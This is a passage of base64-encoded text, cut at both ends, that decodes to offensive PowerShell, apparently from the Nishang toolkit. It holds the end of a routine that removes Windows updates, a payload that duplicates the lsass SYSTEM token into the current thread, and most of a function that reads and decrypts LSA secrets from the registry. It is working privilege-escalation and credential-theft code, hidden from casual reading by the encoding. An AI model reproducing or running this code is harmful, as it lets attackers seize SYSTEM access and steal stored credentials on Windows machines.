HByZXNzaW9uICRSZW1vdmFsQ29tbWFuZAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgCgogICAgICAgIHdoaWxlIChAKEdldC1Qcm9jZXNzIHd1c2EgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkNvdW50IC1uZSAwKQogICAgICAgIHsKICAgICAgICAgICAgU3RhcnQtU2xlZXAgMwogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIldhaXRpbmcgZm9yIHVwZGF0ZSByZW1vdmFsIHRvIGZpbmlzaCAuLi4iCiAgICAgICAgfQogICAgfQoKfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjRHVwbGljYXRlcyB0aGUgQWNjZXNzIHRva2VuIG9mIGxzYXNzIChTWVNURU0pIGFuZCBzZXRzIGl0IGluIHRoZSBjdXJyZW50IHByb2Nlc3MgdGhyZWFkLiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMjIyNUaGFua3MgTmlrbGFzIEdvdWRlIyMjIyMKIyMjI2h0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL2hleXNjcmlwdGluZ2d1eS9hcmNoaXZlLzIwMTIvMDcvMDUvdXNlLXBvd2Vyc2hlbGwtdG8tZHVwbGljYXRlLXByb2Nlc3MtdG9rZW5zLXZpYS1wLWludm9rZS5hc3B4CmZ1bmN0aW9uIEVuYWJsZS1EdXBsaWNhdGVUb2tlbiB7IAoKPCMgCi5TWU5PUFNJUyAKUGF5bG9hZCB3aGljaCBkdXBsaWNhdGVzIHRoZSBBY2Nlc3MgdG9rZW4gb2YgbHNhc3MgYW5kIHNldHMgaXQgaW4gdGhlIGN1cnJlbnQgcHJvY2VzcyB0aHJlYWQuIAogCi5ERVNDUklQVElPTiAKVGhpcyBwYXlsb2FkIGR1cGxpY2F0ZXMgdGhlIEFjY2VzcyB0b2tlbiBvZiBsc2FzcyBhbmQgc2V0cyBpdCBpbiB0aGUgY3VycmVudCBwcm9jZXNzIHRocmVhZC4gClRoZSBwYXlsb2FkIG11c3QgYmUgcnVuIHdpdGggZWxldmF0ZWQgcGVybWlzc2lvbnMuIAoKLkVYQU1QTEUgClBTID4gRW5hYmxlLUR1cGxpY2F0ZVRva2VuCiAKLkxJTksgCmh0dHA6Ly93d3cudHJ1ZXNlYy5jb20gCmh0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL2hleXNjcmlwdGluZ2d1eS9hcmNoaXZlLzIwMTIvMDcvMDUvdXNlLXBvd2Vyc2hlbGwtdG8tZHVwbGljYXRlLXByb2Nlc3MtdG9rZW5zLXZpYS1wLWludm9rZS5hc3B4Cmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCgouTk9URVMgCkdvdWRlIDIwMTIsIFRyZXVTZWMgCiM+IAoKCltDbWRsZXRCaW5kaW5nKCldIApwYXJhbSgpIAogCiRzaWduYXR1cmUgPSBAIiAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMSldIAogICAgIHB1YmxpYyBzdHJ1Y3QgVG9rUHJpdjFMdWlkIAogICAgIHsgCiAgICAgICAgIHB1YmxpYyBpbnQgQ291bnQ7IAogICAgICAgICBwdWJsaWMgbG9uZyBMdWlkOyAKICAgICAgICAgcHVibGljIGludCBBdHRyOyAKICAgICB9IAogCiAgICBwdWJsaWMgY29uc3QgaW50IFNFX1BSSVZJTEVHRV9FTkFCTEVEID0gMHgwMDAwMDAwMjsgCiAgICBwdWJsaWMgY29uc3QgaW50IFRPS0VOX1FVRVJZID0gMHgwMDAwMDAwODsgCiAgICBwdWJsaWMgY29uc3QgaW50IFRPS0VOX0FESlVTVF9QUklWSUxFR0VTID0gMHgwMDAwMDAyMDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFNUQU5EQVJEX1JJR0hUU19SRVFVSVJFRCA9IDB4MDAwRjAwMDA7IAogCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFNUQU5EQVJEX1JJR0hUU19SRUFEID0gMHgwMDAyMDAwMDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FTU0lHTl9QUklNQVJZID0gMHgwMDAxOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fRFVQTElDQVRFID0gMHgwMDAyOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fSU1QRVJTT05BVEUgPSAweDAwMDQ7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9RVUVSWV9TT1VSQ0UgPSAweDAwMTA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfR1JPVVBTID0gMHgwMDQwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQURKVVNUX0RFRkFVTFQgPSAweDAwODA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfU0VTU0lPTklEID0gMHgwMTAwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fUkVBRCA9IChTVEFOREFSRF9SSUdIVFNfUkVBRCB8IFRPS0VOX1FVRVJZKTsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FMTF9BQ0NFU1MgPSAoU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEIHwgVE9LRU5fQVNTSUdOX1BSSU1BUlkgfCAKICAgICAgVE9LRU5fRFVQTElDQVRFIHwgVE9LRU5fSU1QRVJTT05BVEUgfCBUT0tFTl9RVUVSWSB8IFRPS0VOX1FVRVJZX1NPVVJDRSB8IAogICAgICBUT0tFTl9BREpVU1RfUFJJVklMRUdFUyB8IFRPS0VOX0FESlVTVF9HUk9VUFMgfCBUT0tFTl9BREpVU1RfREVGQVVMVCB8IAogICAgICBUT0tFTl9BREpVU1RfU0VTU0lPTklEKTsgCiAKICAgIHB1YmxpYyBjb25zdCBzdHJpbmcgU0VfVElNRV9aT05FX05BTUVURVhUID0gIlNlVGltZVpvbmVQcml2aWxlZ2UiOyAKICAgIHB1YmxpYyBjb25zdCBpbnQgQU5ZU0laRV9BUlJBWSA9IDE7IAogCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldIAogICAgcHVibGljIHN0cnVjdCBMVUlEIAogICAgeyAKICAgICAgcHVibGljIFVJbnQzMiBMb3dQYXJ0OyAKICAgICAgcHVibGljIFVJbnQzMiBIaWdoUGFydDsgCiAgICB9IAogCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldIAogICAgcHVibGljIHN0cnVjdCBMVUlEX0FORF9BVFRSSUJVVEVTIHsgCiAgICAgICBwdWJsaWMgTFVJRCBMdWlkOyAKICAgICAgIHB1YmxpYyBVSW50MzIgQXR0cmlidXRlczsgCiAgICB9IAogCiAKICAgIHB1YmxpYyBzdHJ1Y3QgVE9LRU5fUFJJVklMRUdFUyB7IAogICAgICBwdWJsaWMgVUludDMyIFByaXZpbGVnZUNvdW50OyAKICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdD1BTllTSVpFX0FSUkFZKV0gCiAgICAgIHB1YmxpYyBMVUlEX0FORF9BVFRSSUJVVEVTIFtdIFByaXZpbGVnZXM7IAogICAgfSAKIAogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXSAKICAgICBwdWJsaWMgZXh0ZXJuIHN0YXRpYyBib29sIER1cGxpY2F0ZVRva2VuKEludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLCBpbnQgCiAgICAgICAgU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTCwgb3V0IEludFB0ciBEdXBsaWNhdGVUb2tlbkhhbmRsZSk7IAogCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0gCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0gCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNldFRocmVhZFRva2VuKCAKICAgICAgSW50UHRyIFBIVGhyZWFkLCAKICAgICAgSW50UHRyIFRva2VuIAogICAgKTsgCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0gCiAgICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldIAogICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIE9wZW5Qcm9jZXNzVG9rZW4oSW50UHRyIFByb2Nlc3NIYW5kbGUsICAKICAgICAgIFVJbnQzMiBEZXNpcmVkQWNjZXNzLCBvdXQgSW50UHRyIFRva2VuSGFuZGxlKTsgCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgTG9va3VwUHJpdmlsZWdlVmFsdWUoc3RyaW5nIGhvc3QsIHN0cmluZyBuYW1lLCByZWYgbG9uZyBwbHVpZCk7IAogCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldIAogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7IAogCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldIAogICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzKEludFB0ciBodG9rLCBib29sIGRpc2FsbCwgCiAgICAgcmVmIFRva1ByaXYxTHVpZCBuZXdzdCwgaW50IGxlbiwgSW50UHRyIHByZXYsIEludFB0ciByZWxlbik7IAoiQCAKIAogICRjdXJyZW50UHJpbmNpcGFsID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCggW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpIAogIGlmKCRjdXJyZW50UHJpbmNpcGFsLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikgLW5lICR0cnVlKSB7IAogICAgV3JpdGUtV2FybmluZyAiUnVuIHRoZSBDb21tYW5kIGFzIGFuIEFkbWluaXN0cmF0b3IiIAogICAgQnJlYWsgCiAgfSAKIAogIEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmUgLU5hbWUgQWRqUHJpdiAtTmFtZXNwYWNlIEFkalByaXYgCiAgJGFkalByaXYgPSBbQWRqUHJpdi5BZGpQcml2XSAKICBbbG9uZ10kbHVpZCA9IDAgCiAKICAkdG9rUHJpdjFMdWlkID0gTmV3LU9iamVjdCBBZGpQcml2LkFkalByaXYrVG9rUHJpdjFMdWlkIAogICR0b2tQcml2MUx1aWQuQ291bnQgPSAxIAogICR0b2tQcml2MUx1aWQuTHVpZCA9ICRsdWlkIAogICR0b2tQcml2MUx1aWQuQXR0ciA9IFtBZGpQcml2LkFkalByaXZdOjpTRV9QUklWSUxFR0VfRU5BQkxFRCAKIAogICRyZXRWYWwgPSAkYWRqUHJpdjo6TG9va3VwUHJpdmlsZWdlVmFsdWUoJG51bGwsICJTZURlYnVnUHJpdmlsZWdlIiwgW3JlZl0kdG9rUHJpdjFMdWlkLkx1aWQpIAogIAogIFtJbnRQdHJdJGh0b2tlbiA9IFtJbnRQdHJdOjpaZXJvIAogICRyZXRWYWwgPSAkYWRqUHJpdjo6T3BlblByb2Nlc3NUb2tlbigkYWRqUHJpdjo6R2V0Q3VycmVudFByb2Nlc3MoKSwgW0FkalByaXYuQWRqUHJpdl06OlRPS0VOX0FMTF9BQ0NFU1MsIFtyZWZdJGh0b2tlbikgCiAgIAogICAKICAkdG9rZW5Qcml2aWxlZ2VzID0gTmV3LU9iamVjdCBBZGpQcml2LkFkalByaXYrVE9LRU5fUFJJVklMRUdFUyAKICAkcmV0VmFsID0gJGFkalByaXY6OkFkanVzdFRva2VuUHJpdmlsZWdlcygkaHRva2VuLCAkZmFsc2UsIFtyZWZdJHRva1ByaXYxTHVpZCwgMTIsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybykgCiAKICBpZigtbm90KCRyZXRWYWwpKSB7IAogICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5tYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKSAKICAgIEJyZWFrIAogIH0gCiAKICAkcHJvY2VzcyA9IChHZXQtUHJvY2VzcyAtTmFtZSBsc2FzcykgCiAgW0ludFB0cl0kaGxzYXNzdG9rZW4gPSBbSW50UHRyXTo6WmVybyAKICAkcmV0VmFsID0gJGFkalByaXY6Ok9wZW5Qcm9jZXNzVG9rZW4oJHByb2Nlc3MuSGFuZGxlLCAoW0FkalByaXYuQWRqUHJpdl06OlRPS0VOX0lNUEVSU09OQVRFIC1CT1IgW0FkalByaXYuQWRqUHJpdl06OlRPS0VOX0RVUExJQ0FURSksIFtyZWZdJGhsc2Fzc3Rva2VuKSAKIAogIFtJbnRQdHJdJGR1bGljYXRlVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybyAKICAkcmV0VmFsID0gJGFkalByaXY6OkR1cGxpY2F0ZVRva2VuKCRobHNhc3N0b2tlbiwgMiwgW3JlZl0kZHVsaWNhdGVUb2tlbkhhbmRsZSkgCiAgCiAgJHJldHZhbCA9ICRhZGpQcml2OjpTZXRUaHJlYWRUb2tlbihbSW50UHRyXTo6WmVybywgJGR1bGljYXRlVG9rZW5IYW5kbGUpIAogIGlmKC1ub3QoJHJldFZhbCkpIHsgCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpIAogIH0gCn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI0R1bXBzIExTQSBTZWNyZXRzIGZyb20gdGhlIHRhcmdldCMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyMjVGhhbmtzIE5pa2xhcyBHb3VkZSMjIyMjCiMjIyNodHRwOi8vYmxvZ3MudGVjaG5ldC5jb20vYi9oZXlzY3JpcHRpbmdndXkvYXJjaGl2ZS8yMDEyLzA3LzA2L3VzZS1wb3dlcnNoZWxsLXRvLWRlY3J5cHQtbHNhLXNlY3JldHMtZnJvbS10aGUtcmVnaXN0cnkuYXNweApmdW5jdGlvbiBHZXQtTHNhU2VjcmV0IHsKCjwjCi5TWU5PUFNJUwpQYXlsb2FkIHdoaWNoIGV4dHJhY3RzIExTQSBTZWNyZXRzIGZyb20gbG9jYWwgY29tcHV0ZXIuCgouREVTQ1JJUFRJT04KRXh0cmFjdHMgTFNBIHNlY3JldHMgZnJvbSBIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcIG9uIGEgbG9jYWwgY29tcHV0ZXIuClRoZSBwYXlsb2FkIG11c3QgYmUgcnVuIHdpdGggZWxldmF0ZWQgcGVybWlzc2lvbnMsIGluIDMyLWJpdCBtb2RlIGFuZCByZXF1aXJlcyAKcGVybWlzc2lvbnMgdG8gdGhlIHNlY3VyaXR5IGtleSBpbiBIS0xNLiBUaGUgcGVybWlzc2lvbiBjb3VsZCBiZSBvYnRhaW5lZCBieSB1c2luZwpFbmFibGUtRHVwbGljYXRlVG9rZW4gcGF5bG9hZC4KCi5QQVJBTUVURVIgUmVnaXN0cnlLZXkKTmFtZSBvZiBLZXkgdG8gRXh0cmFjdC4gaWYgdGhlIHBhcmFtZXRlciBpcyBub3QgdXNlZCwgYWxsIHNlY3JldHMgd2lsbCBiZSBkaXNwbGF5ZWQuCgouRVhBTVBMRQpQUyA+IEdldC1Mc2FTZWNyZXQKCi5FWEFNUExFClBTID4gR2V0LUxzYVNlY3JldCAtUmVnaXN0cnlLZXkgS2V5TmFtZQpSZWFkIGNvbnRlbnRzIG9mIHRoZSBrZXkgbWVudGlvbmVkIGFzIHBhcmFtZXRlci4KCi5MSU5LCmh0dHA6Ly93d3cudHJ1ZXNlYy5jb20KaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wNi91c2UtcG93ZXJzaGVsbC10by1kZWNyeXB0LWxzYS1zZWNyZXRzLWZyb20tdGhlLXJlZ2lzdHJ5LmFzcHgKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKCi5OT1RFUwpHb3VkZSAyMDEyLCBUcmV1U2VjCiM+CgogW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnk9JEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZWdpc3RyeUtleQogICAgKQoKICAgIEJlZ2luIHsKICAgICMgQ2hlY2sgaWYgVXNlciBpcyBFbGV2YXRlZAogICAgJGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKCBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkKICAgIGlmKCRjdXJyZW50UHJpbmNpcGFsLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikgLW5lICR0cnVlKSB7CiAgICAgIFdyaXRlLVdhcm5pbmcgIlJ1biB0aGUgQ29tbWFuZCBhcyBhbiBBZG1pbmlzdHJhdG9yIgogICAgICBCcmVhawogICAgfQoKICAgICMgQ2hlY2sgaWYgU2NyaXB0IGlzIHJ1biBpbiBhIDMyLWJpdCBFbnZpcm9ubWVudCBieSBjaGVja2luZyBhIFBvaW50ZXIgU2l6ZQogICAgaWYoW1N5c3RlbS5JbnRQdHJdOjpTaXplIC1lcSA4KSB7CiAgICAgIFdyaXRlLVdhcm5pbmcgIlJ1biBQb3dlclNoZWxsIGluIDMyLWJpdCBtb2RlIgogICAgICBCcmVhawogICAgfQoKCgogICAgIyBDaGVjayBpZiBSZWdLZXkgaXMgc3BlY2lmaWVkCiAgICBpZihbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkcmVnaXN0cnlLZXkpKSB7CiAgICAgIFtzdHJpbmdbXV0kcmVnaXN0cnlLZXkgPSAoU3BsaXQtUGF0aCAoR2V0LUNoaWxkSXRlbSBIS0xNOlxTRUNVUklUWVxQb2xpY3lcU2VjcmV0cyB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgTmFtZSkgLUxlYWYpCiAgICB9CgogICAgIyBDcmVhdGUgVGVtcG9yYXJ5IFJlZ2lzdHJ5IEtleQogICAgaWYoIC1ub3QoVGVzdC1QYXRoICJIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcTXlTZWNyZXQiKSkgewogICAgICBta2RpciAiSEtMTTpcXFNFQ1VSSVRZXFBvbGljeVxTZWNyZXRzXE15U2VjcmV0IiB8IE91dC1OdWxsCiAgICB9CgogICAgJHNpZ25hdHVyZSA9IEAiCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaWMgc3RydWN0IExTQV9VTklDT0RFX1NUUklORwogICAgewogICAgICBwdWJsaWMgVUludDE2IExlbmd0aDsKICAgICAgcHVibGljIFVJbnQxNiBNYXhpbXVtTGVuZ3RoOwogICAgICBwdWJsaWMgSW50UHRyIEJ1ZmZlcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaWMgc3RydWN0IExTQV9PQkpFQ1RfQVRUUklCVVRFUwogICAgewogICAgICBwdWJsaWMgaW50IExlbmd0aDsKICAgICAgcHVibGljIEludFB0ciBSb290RGlyZWN0b3J5OwogICAgICBwdWJsaWMgTFNBX1VOSUNPREVfU1RSSU5HIE9iamVjdE5hbWU7CiAgICAgIHB1YmxpYyB1aW50IEF0dHJpYnV0ZXM7CiAgICAgIHB1YmxpYyBJbnRQdHIgU2VjdXJpdHlEZXNjcmlwdG9yOwogICAgICBwdWJsaWMgSW50UHRyIFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZTsKICAgIH0KCiAgICBwdWJsaWMgZW51bSBMU0FfQWNjZXNzUG9saWN5IDogbG9uZwogICAgewogICAgICBQT0xJQ1lfVklFV19MT0NBTF9JTkZPUk1BVElPTiA9IDB4MDAwMDAwMDFMLAogICAgICBQT0xJQ1lfVklFV19BVURJVF9JTkZPUk1BVElPTiA9IDB4MDAwMDAwMDJMLAogICAgICBQT0xJQ1lfR0VUX1BSSVZBVEVfSU5GT1JNQVRJT04gPSAweDAwMDAwMDA0TCwKICAgICAgUE9MSUNZX1RSVVNUX0FETUlOID0gMHgwMDAwMDAwOEwsCiAgICAgIFBPTElDWV9DUkVBVEVfQUNDT1VOVCA9IDB4MDAwMDAwMTBMLAogICAgICBQT0xJQ1lfQ1JFQVRFX1NFQ1JFVCA9IDB4MDAwMDAwMjBMLAogICAgICBQT0xJQ1lfQ1JFQVRFX1BSSVZJTEVHRSA9IDB4MDAwMDAwNDBMLAogICAgICBQT0xJQ1lfU0VUX0RFRkFVTFRfUVVPVEFfTElNSVRTID0gMHgwMDAwMDA4MEwsCiAgICAgIFBPTElDWV9TRVRfQVVESVRfUkVRVUlSRU1FTlRTID0gMHgwMDAwMDEwMEwsCiAgICAgIFBPTElDWV9BVURJVF9MT0dfQURNSU4gPSAweDAwMDAwMjAwTCwKICAgICAgUE9MSUNZX1NFUlZFUl9BRE1JTiA9IDB4MDAwMDA0MDBMLAogICAgICBQT0xJQ1lfTE9PS1VQX05BTUVTID0gMHgwMDAwMDgwMEwsCiAgICAgIFBPTElDWV9OT1RJRklDQVRJT04gPSAweDAwMDAxMDAwTAogICAgfQoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIFByZXNlcnZlU2lnID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IExzYVJldHJpZXZlUHJpdmF0ZURhdGEoCiAgICAgIEludFB0ciBQb2xpY3lIYW5kbGUsCiAgICAgIHJlZiBMU0FfVU5JQ09ERV9TVFJJTkcgS2V5TmFtZSwKICAgICAgb3V0IEludFB0ciBQcml2YXRlRGF0YQogICAgKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBQcmVzZXJ2ZVNpZyA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBMc2FTdG9yZVByaXZhdGVEYXRhKAogICAgICBJbnRQdHIgcG9saWN5SGFuZGxlLAogICAgICByZWYgTFNBX1VOSUNPREVfU1RSSU5HIEtleU5hbWUsCiAgICAgIHJlZiBMU0FfVU5JQ09ERV9TVFJJTkcgUHJpdmF0ZURhdGEKICAgICk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgUHJlc2VydmVTaWcgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTHNhT3BlblBvbGljeSgKICAgICAgcmVmIExTQV9VTklDT0RFX1NUUklORyBTeXN0ZW1OYW1lLAogICAgICByZWYgTFNBX09CSkVDVF9BVFRSSUJVVEVTIE9iamVjdEF0dHJpYnV0ZXMsCiAgICAgIHVpbnQgRGVzaXJlZEFjY2VzcywKICAgICAgb3V0IEludFB0ciBQb2xpY3lIYW5kbGUKICAgICk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgUHJlc2VydmVTaWcgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTHNhTnRTdGF0dXNUb1dpbkVycm9yKAogICAgICB1aW50IHN0YXR1cwogICAgKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBQcmVzZXJ2ZVNpZyA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBMc2FDbG9zZSgKICAgICAgSW50UHRyIHBvbGljeUhhbmRsZQogICAgKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBQcmVzZXJ2ZVNpZyA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBMc2FGcmVlTWVtb3J5KAogICAgICBJbnRQdHIgYnVmZmVyCiAgICApOwoiQAoKICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmUgLU5hbWUgTFNBVXRpbCAtTmFtZXNwYWNlIExTQVV0aWwKICAgIH0KCiAgICAgIFByb2Nlc3N7CiAgICAgICAgZm9yZWFjaCgka2V5IGluICRSZWdpc3RyeUtleSkgewogICAgICAgICAgJHJlZ1BhdGggPSAiSEtMTTpcXFNFQ1VSSVRZXFBvbGljeVxTZWNyZXRzXCIgKyAka2V5CiAgICAgICAgICAkdGVtcFJlZ1BhdGggPSAiSEtMTTpcXFNFQ1VSSVRZXFBvbGljeVxTZWNyZXRzXE15U2VjcmV0IgogICAgICAgICAgJG15S2V5ID0gIk15U2VjcmV0IgogICAgICAgICAgaWYoVGVzdC1QYXRoICRyZWdQYXRoKSB7CiAgICAgICAgICAgIFRyeSB7CiAgICAgICAgICAgICAgR2V0LUNoaWxkSXRlbSAkcmVnUGF0aCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2ggewogICAgICAgICAgICAgIFdyaXRlLUVycm9yIC1NZXNzYWdlICJBY2Nlc3MgdG8gcmVnaXN0cnkgRGVuaWVkLCBydW4gYXMgTlQgQVVUSE9SSVRZXFNZU1RFTSIgLUNhdGVnb3J5IFBlcm1pc3Npb25EZW5pZWQKICAgICAgICAgICAgICBCcmVhawogICAgICAgICAgICB9ICAgICAgCgogICAgICAgICAgICBpZihUZXN0LVBhdGggJHJlZ1BhdGgpIHsKICAgICAgICAgICAgICAjIENvcHkgS2V5CiAgICAgICAgICAgICAgIkN1cnJWYWwiLCJPbGRWYWwiLCJPdXBkVGltZSIsIkN1cGRUaW1lIiwiU2VjRGVzYyIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkY29weUZyb20gPSAiSEtMTTpcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcIiArICRrZXkgKyAiXCIgKyAkXwogICAgICAgICAgICAgICAgJGNvcHlUbyA9ICJIS0xNOlxTRUNVUklUWVxQb2xpY3lcU2VjcmV0c1xNeVNlY3JldFwiICsgJF8KCiAgICAgICAgICAgICAgICBpZiggLW5vdChUZXN0LVBhdGggJGNvcHlUbykgKSB7CiAgICAgICAgICAgICAgICAgIG1rZGlyICRjb3B5VG8gfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGl0ZW0gPSBHZXQtSXRlbVByb3BlcnR5ICRjb3B5RnJvbQogICAgICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY29weVRvIC1OYW1lICcoZGVmYXVsdCknIC1WYWx1ZSAkaXRlbS4nKGRlZmF1bHQpJwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAjIEF0dHJpYnV0ZXMKICAgICAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMgPSBOZXctT2JqZWN0IExTQVV0aWwuTFNBVXRpbCtMU0FfT0JKRUNUX0FUVFJJQlVURVMKICAgICAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMuTGVuZ3RoID0gMAogICAgICAgICAgICAkb2JqZWN0QXR0cmlidXRlcy5Sb290RGlyZWN0b3J5ID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMuQXR0cmlidXRlcyA9IDAKICAgICAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMuU2VjdXJpdHlEZXNjcmlwdG9yID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJG9iamVjdEF0dHJpYnV0ZXMuU2VjdXJpdHlRdWFsaXR5T2ZTZXJ2aWNlID0gW0ludFB0cl06Olplcm8KCiAgICAgICAgICAgICMgbG9jYWxTeXN0ZW0KICAgICAgICAgICAgJGxvY2Fsc3l